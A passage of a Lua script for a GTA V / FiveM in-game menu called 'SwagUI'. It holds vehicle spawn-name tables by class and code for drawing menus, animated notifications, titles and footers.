		{"FAGGIO3", "sssa_dlc_biker"},
		{"FCR"},
		{"FCR2", "lsc_dlc_import_export"},
		{"GARGOYLE", "mba_vehicles"},
		{"HAKUCHOU", "sssa_dlc_its_creator"},
		{"HAKUCHOU2", "lgm_dlc_biker"},
		{"HEXER", "sssa_default"},
		{"INNOVATION", "sssa_dlc_heist"},
		{"LECTRO", "lgm_dlc_heist"},
		{"MANCHEZ", "sssa_dlc_biker"},
		{"NEMESIS", "sssa_dlc_heist"},
		{"NIGHTBLADE", "sssa_dlc_biker"},
		{"OPPRESSOR", "candc_gunrunning"},
		{"OPPRESSOR2", "candc_battle"},
		{"PCJ", "sssa_default"},
		{"RATBIKE", "sssa_dlc_biker"},
		{"RUFFIAN", "sssa_default"},
		{"SANCHEZ", "sssa_default"},
		{"SANCHEZ2", "sssa_default"},
		{"SANCTUS", "sssa_dlc_biker"},
		{"SHOTARO", "lgm_dlc_biker"},
		{"SOVEREIGN", "sssa_dlc_heist"},
		{"THRUST", "lgm_dlc_business2"},
		{"VADER", "sssa_default"},
		{"VINDICATOR", "lgm_dlc_swage"},
		{"VORTEX", "sssa_dlc_biker"},
		{"WOLFSBANE", "sssa_dlc_biker"},
		{"ZOMBIEA", "sssa_dlc_biker"},
		{"ZOMBIEB", "sssa_dlc_biker"},
	},
	
	offroad = {
		{"BFINJECTION", "sssa_default", "bfinject"},
		{"BIFTA", "sssa_default"},
		{"BLAZER", "sssa_default"},
		{"BLAZER2", "candc_casinoheist"},
		{"BLAZER3"},
		{"BLAZER4", "sssa_dlc_biker"},
		{"BLAZER5", "candc_importexport"},
		{"BODHI2", "sssa_default"},
		{"BRAWLER", "lgm_dlc_swage"},
		{"BRUISER"},
		{"BRUISER2"},
		{"BRUISER3"},
		{"BRUTUS"},
		{"BRUTUS2"},
		{"BRUTUS3"},
		{"CARACARA", "sssa_dlc_vinewood"},
		{"DLOADER"},
		{"DUBSTA3", "candc_default"},
		{"DUNE", "sssa_default"},
		{"DUNE2"},
		{"DUNE3", "candc_gunrunning"},
		{"DUNE4"},
		{"DUNE5", "candc_importexport"},
		{"FREECRAWLER", "lgm_dlc_battle"},
		{"INSURGENT", "candc_default"},
		{"INSURGENT2", "candc_default"},
		{"INSURGENT3"},
		{"KALAHARI", "sssa_default"},
		{"KAMACHO", "sssa_dlc_xmas2017"},
		{"MARSHALL", "candc_default"},
		{"MENACER", "candc_battle"},
		{"MESA3", "candc_default"},
		{"MONSTER", "candc_default"},
		{"MONSTER3"},
		{"MONSTER4"},
		{"MONSTER5"},
		{"NIGHTSHARK", "candc_gunrunning"},
		{"RANCHERXL", "sssa_dlc_business", "rancherx"},
		{"RANCHERXL2"},
		{"RCBANDITO", "sssa_dlc_arena"},
		{"REBEL", "sssa_default"},
		{"REBEL2"},
		{"RIATA", "sssa_dlc_xmas2017"},
		{"SANDKING", "sssa_default"},
		{"SANDKING2", "sssa_default", "sandkin2"},
		{"TECHNICAL", "candc_default"},
		{"TECHNICAL2", "candc_importexport"},
		{"TECHNICAL3"},
		{"TROPHYTRUCK"},
		{"TROPHYTRUCK2"},
	},
	
	industrial = {
		{"BULLDOZER"},
		{"CUTTER"},
		{"DUMP", "candc_default"},
		{"FLATBED"},
		{"GUARDIAN", "sssa_dlc_heist"},
		{"HANDLER"},
		{"MIXER"},
		{"MIXER2"},
		{"RUBBLE"},
		{"TIPTRUCK"},
		{"TIPTRUCK2"},
	},
	
	utility = {
		{"AIRTUG"},
		{"CADDY"},
		{"CADDY2"},
		{"CADDY3"},
		{"DOCKTUG"},
		{"FORKLIFT"},
		{"TRACTOR2"},
		{"TRACTOR3"},
		{"MOWER"},
		{"RIPLEY"},
		{"SADLER", "sssa_default"},
		{"SADLER2"},
		{"SCRAP"},
		{"TOWTRUCK"},
		{"TOWTRUCK2"},
		{"TRACTOR"},
		{"UTILLITRUCK"},
		{"UTILLITRUCK2"},
		{"UTILLITRUCK3"},
		{"ARMYTRAILER"},
		{"ARMYTRAILER2"},
		{"FREIGHTTRAILER"},
		{"ARMYTANKER"},
		{"TRAILERLARGE"},
		{"DOCKTRAILER"},
		{"TR3"},
		{"TR2"},
		{"TR4"},
		{"TRFLAT"},
		{"TRAILERS"},
		{"TRAILERS4"},
		{"TRAILERS2"},
		{"TRAILERS3"},
		{"TVTRAILER"},
		{"TRAILERLOGS"},
		{"TANKER"},
		{"TANKER2"},
		{"BALETRAILER"},
		{"GRAINTRAILER"},
		{"BOATTRAILER"},
		{"RAKETRAILER"},
		{"TRAILERSMALL"},
	},
	
	vans = {
		{"BISON", "sssa_default"},
		{"BISON2"},
		{"BISON3"},
		{"BOBCATXL", "sssa_dlc_business"},
		{"BOXVILLE", "candc_casinoheist"},
		{"BOXVILLE2"},
		{"BOXVILLE3"},
		{"BOXVILLE4", "candc_default"},
		{"BOXVILLE5", "candc_importexport"},
		{"BURRITO"},
		{"BURRITO2", "candc_casinoheist"},
		{"BURRITO3"},
		{"BURRITO4"},
		{"BURRITO5"},
		{"CAMPER"},
		{"GBURRITO"},
		{"GBURRITO2", "sssa_dlc_heist"},
		{"JOURNEY", "candc_default"},
		{"MINIVAN", "sssa_dlc_business"},
		{"MINIVAN2", "lsc_lowrider2"},
		{"PARADISE", "sssa_default"},
		{"PONY"},
		{"PONY2"},
		{"RUMPO", "sssa_dlc_heist"},
		{"RUMPO2"},
		{"RUMPO3", "sssa_dlc_executive_1"},
		{"SPEEDO"},
		{"SPEEDO2"},
		{"SPEEDO4"},
		{"SURFER"},
		{"SURFER2"},
		{"TACO"},
		{"YOUGA"},
		{"YOUGA2", "sssa_dlc_biker"},
	},
	
	cycles = {
		{"BMX", "pandm_default"},
		{"CRUISER", "pandm_default"},
		{"FIXTER"},
		{"SCORCHER", "pandm_default"},
		{"TRIBIKE", "pandm_default"},
		{"TRIBIKE2", "pandm_default"},
		{"TRIBIKE3", "pandm_default"},
	},
	
	boats = {
		{"DINGHY", "dock_default", "DINGHY3"},
		{"DINGHY2", "dock_default", "DINGHY3"},
		{"DINGHY3", "dock_default"},
		{"DINGHY4", "dock_default", "DINGHY3"},
		{"JETMAX", "dock_default"},
		{"MARQUIS", "dock_default"},
		{"PREDATOR"},
		{"SEASHARK", "dock_default"},
		{"SEASHARK2"},
		{"SEASHARK3"},
		{"SPEEDER", "dock_default"},
		{"SPEEDER2"},
		{"SQUALO", "dock_default"},
		{"SUBMERSIBLE"},
		{"SUBMERSIBLE2"},
		{"SUNTRAP", "dock_default"},
		{"TORO", "dock_default"},
		{"TORO2", "dock_default", "TORO"},
		{"TROPIC", "dock_default"},
		{"TROPIC2"},
		{"TUG", "dock_dlc_executive1"},
	},
	
	helicopters = {
		{"AKULA", "candc_xmas2017"},
		{"ANNIHILATOR"},
		{"BUZZARD", "candc_default"},
		{"BUZZARD2"},
		{"CARGOBOB", "candc_default"},
		{"CARGOBOB2", "candc_executive1"},
		{"CARGOBOB3"},
		{"CARGOBOB4"},
		{"FROGGER"},
		{"FROGGER2"},
		{"HAVOK", "elt_dlc_smuggler"},
		{"HUNTER", "candc_smuggler"},
		{"MAVERICK"},
		{"POLMAV"},
		{"SAVAGE", "candc_default"},
		{"SEASPARROW", "elt_dlc_assault", "sparrow"},
		{"SKYLIFT"},
		{"SUPERVOLITO"},
		{"SUPERVOLITO2"},
		{"SWIFT", "elt_dlc_pilot"},
		{"SWIFT2", "elt_dlc_swage"},
		{"VALKYRIE", "candc_default"},
		{"VALKYRIE2"},
		{"VOLATUS", "elt_dlc_executive1"},
	},
	
	planes = {
		{"ALPHAZ1", "elt_dlc_smuggler"},
		{"AVENGER"},
		{"AVENGER2"},
		{"BESRA", "elt_dlc_pilot"},
		{"BLIMP"},
		{"BLIMP2"},
		{"BLIMP3", "elt_dlc_battle"},
		{"BOMBUSHKA", "candc_smuggler"},
		{"CARGOPLANE"},
		{"CUBAN800"},
		{"DODO"},
		{"DUSTER"},
		{"HOWARD", "elt_dlc_smuggler"},
		{"HYDRA", "candc_default"},
		{"JET"},
		{"LAZER", "candc_smuggler"},
		{"SWAGOR"},
		{"SWAGOR2", "elt_dlc_swage"},
		{"MAMMATUS"},
		{"MICROLIGHT", "elt_dlc_smuggler"},
		{"MILJET", "elt_dlc_pilot"},
		{"MOGUL", "candc_smuggler"},
		{"MOLOTOK", "candc_smuggler"},
		{"NIMBUS", "elt_dlc_executive1"},
		{"NOKOTA", "candc_smuggler"},
		{"PYRO", "candc_smuggler"},
		{"ROGUE", "candc_smuggler"},
		{"SEABREEZE", "elt_dlc_smuggler"},
		{"SHAMAL"},
		{"STARLING", "candc_smuggler"},
		{"STRIKEFORCE", "candc_battle"},
		{"STUNT"},
		{"TITAN"},
		{"TULA", "candc_smuggler"},
		{"VELUM"},
		{"VELUM2"},
		{"VESTRA", "elt_dlc_business"},
		{"VOLATOL", "candc_xmas2017"},
	},
		
	service = {
		{"AIRBUS", "candc_default"},
		{"BRICKADE", "candc_executive1"},
		{"BUS", "candc_default"},
		{"COACH", "candc_default"},
		{"PBUS2", "sssa_dlc_battle"},
		{"RALLYTRUCK", "sssa_dlc_mp_to_sp"},
		{"RENTALBUS"},
		{"TAXI"},
		{"TOURBUS"},
		{"TRASH"},
		{"TRASH2"},
		{"WASTELANDER", "candc_importexport", "wastlndr"},
		{"AMBULANCE"},
		{"FBI"},
		{"FBI2"},
		{"FIRETRUK", "candc_casinoheist"},
		{"LGUARD", "candc_casinoheist"},
		{"PBUS", "candc_default"},
		{"POLICE"},
		{"POLICE2"},
		{"POLICE3"},
		{"POLICE4"},
		{"POLICEB"},
		{"POLICEOLD1"},
		{"POLICEOLD2"},
		{"POLICET"},
		{"POLMAV"},
		{"PRANGER"},
		{"PREDATOR"},
		{"RIOT"},
		{"RIOT2", "candc_xmas2017"},
		{"SHERIFF"},
		{"SHERIFF2"},
		{"APC", "candc_gunrunning"},
		{"BARRACKS", "candc_default"},
		{"BARRACKS2"},
		{"BARRACKS3"},
		{"BARRAGE", "candc_xmas2017"},
		{"CHERNOBOG", "candc_xmas2017"},
		{"CRUSADER", "candc_default"},
		{"HALFTRACK", "candc_gunrunning"},
		{"KHANJALI", "candc_xmas2017"},
		{"RHINO", "candc_default"},
		{"SCARAB"},
		{"SCARAB2"},
		{"SCARAB3"},
		{"THRUSTER", "candc_xmas2017"},
		{"TRAILERSMALL2"},
	},
		
	commercial = {
		{"BENSON"},
		{"BIFF"},
		{"CERBERUS"},
		{"CERBERUS2"},
		{"CERBERUS3"},
		{"HAULER"},
		{"HAULER2"},
		{"MULE", "candc_default"},
		{"MULE2"},
		{"MULE3", "candc_default"},
		{"MULE4", "candc_battle"},
		{"PACKER"},
		{"PHANTOM"},
		{"PHANTOM2", "candc_importexport"},
		{"PHANTOM3"},
		{"POUNDER"},
		{"POUNDER2", "candc_battle"},
		{"STOCKADE", "candc_casinoheist"},
		{"STOCKADE3"},
		{"TERBYTE"},
		{"CABLECAR"},
		{"FREIGHT"},
		{"FREIGHTCAR"},
		{"FREIGHTCONT1"},
		{"FREIGHTCONT2"},
		{"FREIGHTGRAIN"},
		{"METROTRAIN"},
		{"TANKERCAR"},
	},

}


---------------------
--  SwagUI Class  --
---------------------

SwagUI = {}

SwagUI.debug = false

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local aspectRatio = GetAspectRatio(true)
local screenResolution = GetActiveScreenResolution()

local menuWidth = 0.14 -- old version was 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local separatorHeight = 0.0025

local buttonHeight = 0.025
local buttonFont = 4
local buttonScale = 0.37
local buttonTextXOffset = 0.002
local buttonTextYOffset = 0.0015
local buttonSpriteXOffset = 0.011
local buttonSpriteScale = { x = 0.016, y = 0 }

local fontHeight = GetTextScaleHeight(buttonScale, buttonFont)

local sliderWidth = (menuWidth / 4)

local sliderHeight = 0.016

local knobWidth = 0.002
local knobHeight = 0.016

local sliderFontScale = 0.275
local sliderFontHeight = GetTextScaleHeight(sliderFontScale, buttonFont)


local toggleInnerWidth = 0.008
local toggleInnerHeight = 0.014
local toggleOuterWidth = 0.01125
local toggleOuterHeight = 0.020

-- Vehicle preview, PlayerInfo, etc
local previewWidth = 0.100

local frameWidth = (1.0/screenResolution)*2

local footerHeight = (1.0/screenResolution)*8

local t
local pow = function(num, pow) return num ^ pow end
local sin = math.sin
local cos = math.cos
local sqrt = math.sqrt
local abs = math.abs
local asin  = math.asin

------------------------------------------------------------------------
-- t = time == how much time has to pass for the tweening to complete --
-- b = begin == starting property value								  --
-- c = change == ending - beginning									  --
-- d = duration == running time. How much time has passed *right now* --
------------------------------------------------------------------------

local cout = function(text) return end

local function outCubic(t, b, c, d)
	t = t / d - 1
	return c * (pow(t, 3) + 1) + b
end

local function inCubic (t, b, c, d)
	t = t / d
	return c * pow(t, 3) + b
end

local function inOutCubic(t, b, c, d)
	t = t / d * 2
	if t < 1 then
		return c / 2 * t * t * t + b
	else
		t = t - 2
		return c / 2 * (t * t * t + 2) + b
	end
end
  
local function outInCubic(t, b, c, d)
	if t < d / 2 then
		return outCubic(t * 2, b, c / 2, d)
	else
		return inCubic((t * 2) - d, b + c / 2, c / 2, d)
	end
end

local notifyBody = {
	-- Text
	scale = 0.35,
	offsetLine = 0.0235, -- text height: 0.019 | newline height: 0.005 or 0.006
	finalPadding = 0.01,
	-- Warp
	offsetX = 0.095, -- 0.0525
	offsetY = 0.009875, -- 0.01
	-- Draw below footer
	footerYOffset = 0,
	-- Sprite
	dict = 'commonmenu',
	sprite = 'header_gradient_script',
	font = 4,
	width = menuWidth + frameWidth, 
	height = 0.023, -- magic 0.8305 -- 0.011625
	heading = 90.0,
	-- Betwenn != notifications
	gap = 0.006,
}

local notifyDefault = {
	text = "Someone forgot to change me!",
	type = 'info',
	timeout = 6000,
	transition = 750,
}

local function NotifyCountLines(v, text)
	BeginTextCommandLineCount("notification_buffer")
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + notifyBody.width / 2)
	AddTextComponentSubstringPlayerName(text)
	local nbrLines = GetTextScreenLineCount(v.x - notifyBody.offsetX, v.y - notifyBody.height)
	return nbrLines
end

-- Thread content
local function MakeRoomThread(v, from, to, duration)
	local notif = v
	local beginVal = from
	local endVal = to
	local change = endVal - beginVal

	local timer = 0
	
	local function SetTimer()
		timer = GetGameTimer()
	end
	
	local function GetTimer()
		return GetGameTimer() - timer
	end

	local new_what
	SetTimer()
	local isMoving = true
	while isMoving do
		new_what = outCubic(GetTimer(), beginVal, change, duration)
		if notif.y < endVal then
			notif.y = new_what
		else
			notif.y = endVal
			isMoving = false
			break
		end
		Wait(5)
	end

	-- print("make room done")
end

-- Animating the 'push' transition of NotifyPrioritize
local function NotifyMakeRoom(v, from, to, duration)
	CreateThread(function()
		return MakeRoomThread(v, from, to, duration)
	end)
end

-- Does nothing right now; not used
local function NotifyGetResolutionConfiguration()
	SetScriptGfxAlign(string.byte('L'), string.byte('B'))
	local minimapTopX, minimapTopY = GetScriptGfxPosition(-0.0045, 0.002 + (-0.188888))
	ResetScriptGfxAlign()
	
	local w, h = GetActiveScreenResolution()
	
	return { x = minimapTopX, y = minimapTopY }
end

-- Pushes previous notifications down. Showing the incoming notification on top
local function NotifyPrioritize(v, id, duration)
	for i, _ in pairs(v) do
		if i ~= id then
			if v[i].draw then
				NotifyMakeRoom(v[i], v[i].y, v[i].y + ((notifyBody.height + ((v[id].lines - 1) * notifyBody.height)) + notifyBody.gap), duration)
			end
		end
	end
end

local fontHeight = GetTextScaleHeight(notifyBody.scale, notifyBody.font)

local properties = { -- 0.72
	x = 0.78 + menuWidth / 2, 
	y = 1.0, 
	notif = {}, 
	offset = NotifyPrioritize,
}

local sound_type = {
	['success'] = { name = "CHALLENGE_UNLOCKED", set = "HUD_AWARDS"},
	['info'] = { name = "FocusIn", set = "HintCamSounds" },
	['error'] = { name = "CHECKPOINT_MISSED", set = "HUD_MINI_GAME_SOUNDSET"},
}

local draw_type = {
	['success'] = { color = themeColors.green, dict = "commonmenu", sprite = "shop_tick_icon", size = 0.016},
	['info'] = { color = themeColors.blue, dict = "shared", sprite = "info_icon_32", size = 0.012},
	['error'] = { color = themeColors.red, dict = "commonmenu", sprite = "shop_lock", size = 0.016},
}

-- Text render wrapper for dynamic animation
local function NotifyDrawText(v, text)
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + (menuWidth / 2))
	SetTextColour(255, 255, 255, v.opacity)

	BeginTextCommandDisplayText("notification_buffer")
	AddTextComponentSubstringPlayerName("    " .. text)
	EndTextCommandDisplayText(v.x - notifyBody.width / 2 + frameWidth / 2 + buttonTextXOffset, v.y - notifyBody.gap) -- (notifyBody.height / 2 - fontHeight / 2)
end

-- DrawSpriteScaled and DrawRect wrapper for dynamic animation
local function NotifyDrawBackground(v)
	-- Background
	DrawRect(v.x, v.y + ((v.lines - 1) * (notifyBody.height / 2)) + notifyBody.gap, notifyBody.width, notifyBody.height + ((v.lines - 1) * notifyBody.height), draw_type[v.type].color.r, draw_type[v.type].color.g, draw_type[v.type].color.b, v.opacity - 100) --57,55,91
	DrawSpriteScaled(draw_type[v.type].dict, draw_type[v.type].sprite, v.x - notifyBody.width / 2 + 0.008, v.y + notifyBody.gap, draw_type[v.type].size, nil, 0.0, 255, 255, 255, v.opacity)
	-- Highlight
	-- DrawRect(v.x - 0.0025 - (notifyBody.width / 2), v.y + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding) / 2, 0.005, notifyBody.height + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding), draw_type[v.type].r, draw_type[v.type].g, draw_type[v.type].b, v.opacity) -- 116, 92, 151
	
	
	--DrawRect(minimap.x, minimap.y, 0.01, 0.015, 255, 255, 255, v.opacity)
	--DrawSpriteScaled(body.dict, body.sprite, v.x - 0.045, v.y, 0.010, 0.04, 0, 255, 255, 255, v.opacity - 50)
end

local function NotifyFormat(inputString, ...)
	local format = string.format
	text = format(inputString, ...)
	return text
end

local notifyPreviousText = nil

local notifyQueue = 0

-- Free up the `p.notif` table if notification is no longer being drawn on screen
local function NotifyRecycle()
	--local disposeList = {}
	local notif = properties.notif

	-- print("^3NotifyRecycle: ^0Old table size: ^3" .. #p.notif)

	local drawnTable = {}

	-- allocate notifications currently on screen to drawnTable
	for i, _ in pairs(notif) do
		if notif[i].draw then
			drawnTable[i] = notif[i]
		end
	end

	-- remove notifications if they aren't drawing; shrinks size of table
	notif = drawnTable


	-- print("^3NotifyRecycle: ^0New table size: ^3" .. #p.notif)
	-- print("^3NotifyRecycle: ^4Returning: ^3" .. #p.notif + 1)
	return #notif + 1
end

-- Responsible for making sure the notification 'stick' to the menu footer
local function NotifyRecalibrate()
	local p = properties
	local stackIndex = 0

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			stackIndex = stackIndex + 1
		end
	end

	-- print("^5Recalibrate:^0 table size is " .. stackIndex)

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			if p.notif[id].tin then p.notif[id].tin = false end
			-- if p.notif[id].makeRoom then p.notif[id].makeRoom = false end

			-- print("^5Recalibrate ID: ^0" .. id)
			p.notif[id].y = (p.y - notifyBody.footerYOffset) + ((notifyBody.height + ((p.notif[id].lines - 1) * notifyBody.height) + notifyBody.gap) * (stackIndex - 1))
		
			stackIndex = stackIndex - 1
		end
	end
end

-- Define thread function
local function NotifyNewThread(options)
	local text = options.text or notifyDefault.text
	local transition = options.transition or notifyDefault.transition
	local timeout = options.timeout or notifyDefault.timeout
	local type = options.type or notifyDefault.type
	local sound = sound_type[type]
	
	local p = properties

	local nbrLines = NotifyCountLines(p, text)

	local beginY = 0.0
	local beginAlpha = 0
	
	-- garbage queueing system :)
	notifyQueue = notifyQueue + transition
	Wait(notifyQueue - transition)
	
	local id = NotifyRecycle()

	--print("^3-------- Notification " .. id .. " " .. type .. "--------")
	p.notif[id] = {
		x = p.x,
		y = 0,
		type = type,
		opacity = 0,
		lines = nbrLines,
		tin = true,
		draw = true,
		tout = false,
	}

	p.offset(p.notif, id, transition) --(0.05 * (id - 1))
	
	-- Drawing
	local function NotifyDraw()
		SetScriptGfxDrawOrder(5)
		while p.notif[id].draw do
			if SwagUI.IsAnyMenuOpened() then
				NotifyDrawBackground(p.notif[id])
				NotifyDrawText(p.notif[id], text)
			end
			Wait(0)
		end
	
		-- Schedule notification for garbage collection
		p.notif[id].dispose = true
	end
	CreateThread(NotifyDraw)

	-- Transition In
	local function NotifyFadeIn()
		local change = p.y - notifyBody.footerYOffset

		local timer = 0
	
		local function SetTimerIn() -- set the timer to 0
			timer = GetGameTimer()
		end
	
		local function GetTimerIn() -- gets the timer (counts up)
			return GetGameTimer() - timer
		end
		
		--PlaySoundFrontend(-1, sound.name, sound.set, true)
	
		SetTimerIn() -- reset current timer to 0
		while p.notif[id].tin do
			local tinY = outCubic(GetTimerIn(), beginY, change, transition)
			local tinAlpha = inOutCubic(GetTimerIn(), beginAlpha, 255, transition)
	
			if p.notif[id].y >= change then
				p.notif[id].y = change
				p.notif[id].tin = false
				break
			else
				p.notif[id].y = tinY
				p.notif[id].opacity = floor(tinAlpha + 0.5)
			end
			Wait(5)
		end
		notifyQueue = notifyQueue - transition
		p.notif[id].opacity = 255
	end
	CreateThread(NotifyFadeIn)

	-- Fade out wait timeout
	Wait(timeout + transition)
	p.notif[id].beginOut = true
	p.notif[id].tout = true
	
	-- Fade out
	local function NotifyFadeOut()
		local timer = 0
	
		local function SetTimerOut(ms)
			timer = GetGameTimer() - ms
		end
	
		local function GetTimerOut()
			return GetGameTimer() - timer
		end
	
		while p.notif[id].draw do
			while p.notif[id].tout do
				
				if p.notif[id].beginOut then 
					SetTimerOut(0)
					p.notif[id].beginOut = false 
				end
	
				local opa = inOutCubic(GetTimerOut(), 255, -510, transition)
				if opa <= 0 then
	
					p.notif[id].tout = false
					p.notif[id].draw = false
	
					break
				else
					p.notif[id].opacity = floor(opa + 0.5)
				end
				Wait(5)
			end
			
			Wait(5)
		end
	end
	CreateThread(NotifyFadeOut)
end



local function debugPrint(text)
	if SwagUI.debug then
		Citizen.Trace("[SwagUI] " .. text)
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, restoreIndex)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)
		setMenuProperty(id, "currentOption", 1)

		if restoreIndex then
			setMenuProperty(id, "currentOption", menus[id].storedOption)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuProperty(currentMenu, "storedOption", menus[currentMenu].currentOption)
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end

		
		if dynamicColorTheme then

			if isMenuVisible("SelfMenu") then
				_menuColor.base = themeColors.green
			elseif isMenuVisible("OnlinePlayersMenu") then
				_menuColor.base = themeColors.blue
			elseif isMenuVisible("VisualMenu") then
				_menuColor.base = themeColors.white
			elseif isMenuVisible("TeleportMenu") then
				_menuColor.base = themeColors.yellow
			elseif isMenuVisible("LocalVehicleMenu") then
				_menuColor.base = themeColors.orange
			elseif isMenuVisible("LocalWepMenu") then
				_menuColor.base = themeColors.red
			elseif isMenuVisible("SwagMainMenu") then
				_menuColor.base = themeColors.purple 
			end
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		--SetTextDropShadow(2, 2, 0, 0, 0)
	end
	SetTextOutline()

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function drawPreviewText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			local rX = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2
			SetTextWrap(rX, rX + previewWidth / 2 - buttonTextXOffset / 2)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("preview_text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

-- [NOTE] MenuDrawTitle
local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2
		if menus[currentMenu].background == "default" then
			if _menuColor.base == themeColors.purple then
				drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
			else
				DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- 255, 76, 60,
				DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
		elseif menus[currentMenu].background == "weaponlist" then
			if _menuColor.base == themeColors.purple then
				DrawSpriteScaled("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 255, 255, 140) -- 255, 76, 60,
			else
				DrawSpriteScaled("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
			 -- rgb(155, 89, 182)
		elseif menus[currentMenu].titleBackgroundSprite then
			DrawSpriteScaled(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		

			
		--[[
		
		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				{ r = 180, g = 90, b = 70, a = 255 },
				buttonScale,
				false,
				false,
				true
			)
		end
		]]
	end
end

local welcomeMsg = true

local function drawFooter()
	if menus[currentMenu] then
		local multiplier = nil
		local x = menus[currentMenu].x + menuWidth / 2
		-- local y = menus[currentMenu].y + titleHeight - 0.015 + buttonHeight + menus[currentMenu].maxOptionCount * buttonHeight
		-- DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- r = 231, g = 76, b = 60
		local footerColor = menus[currentMenu].menuFrameColor

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount >= menus[currentMenu].currentOption then
			multiplier = 10
		end

		if multiplier then
			local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) --0.015

			-- Footer
			drawRect(x, y + (footerHeight / 2), menuWidth, footerHeight, footerColor)
			
			local yFrame = menus[currentMenu].y + titleHeight + ((buttonHeight + separatorHeight + (buttonHeight * multiplier) + footerHeight) / 2)
			local frameHeight = buttonHeight + separatorHeight + footerHeight + (buttonHeight * multiplier)
			-- Frame Left
			drawRect(x - frameWidth - menuWidth / 2, yFrame, (frameWidth*2), frameHeight, footerColor)
			-- Frame Right
			drawRect(x + frameWidth + menuWidth / 2, yFrame, (frameWidth*2), frameHeight, footerColor)
			
			--drawText(menus[currentMenu].version, menus[currentMenu].x + buttonTextXOffset, y - separatorHeight + (footerHeight / 2 - fontHeight / 2), menus[currentMenu].titleFont, {r = 255, g = 255, b = 255, a = 128}, buttonScale, false)
			--drawText(menus[currentMenu].subTitle, menus[currentMenu].x + menuWidth / 2, y - separatorHeight + (footerHeight / 2 - fontHeight / 2), menus[currentMenu].titleFont, { r = 255, g = 255, b = 255, a = 255 }, buttonScale, true, false, false)
			
			local offset = 1.0 - (y + footerHeight / 2 + notifyBody.height)

			--local x = menus[currentMenu].x + menuWidth / 2
			local y = menus[currentMenu].y + titleHeight + buttonHeight / 2 + separatorHeight
			
			-- Header
			local function RGB(frequency)
				local result = {}
				local curtime = GetGameTimer() / 1000

				result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
				result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
				result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

				return result
			end
			local rainbow = RGB(100.0)
			
			local xpx = 1/screenResolution.x
			
			
			drawRect(x, y, menuWidth, buttonHeight + (separatorHeight*2), menus[currentMenu].menuFrameColor)
